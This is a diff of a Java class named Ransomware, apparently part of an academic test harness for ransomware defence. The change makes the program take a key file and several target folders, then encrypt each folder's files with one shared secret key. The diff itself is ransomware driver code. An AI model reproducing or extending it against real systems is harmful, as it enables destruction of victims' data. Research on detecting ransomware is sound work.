@@ -31,14 +31,13 @@ public class Ransomware {
 	private static final long bigFileDimension = 50000000;
 	private static final int BUFFER_SIZE = 4096; // 4KB
 
+	/**
+	 * 
+	 * @param args key file, target folders
+	 */
 	public static void main( String[] args ) {
 
-		File dir = new File( args[ 0 ] );
-
-		if ( !dir.isDirectory() ) {
-			System.out.println( "Not a directory" );
-			System.exit( -1 );
-		}
+		File key_file = new File( args[ 0 ] );
 
 
 		//Generate secretKey
@@ -60,8 +59,7 @@ public class Ransomware {
 
 		//Save secretKey
 		try {
-			File file = new File( "/home/studente/Desktop/Ranflood/secretKey.txt" );
-			FileWriter fw = new FileWriter( file );
+			FileWriter fw = new FileWriter( key_file );
 			fw.write( encodedKey );
 			fw.close();
 		} catch ( IOException e ) {
@@ -70,7 +68,17 @@ public class Ransomware {
 		}
 		//Use the same secretKey for all the files
 
-		loopFile( dir, null, secretKey );
+		for ( int i = 1; i < args.length; i++ ) {
+			File dir = new File( args[ i ] );
+			System.out.println("dir: " + dir.getAbsolutePath());
+
+			if ( !dir.isDirectory() ) {
+				System.out.println( "Not a directory" );
+				continue;
+			}
+
+			loopFile( dir, null, secretKey );
+		}
 
 
 	}
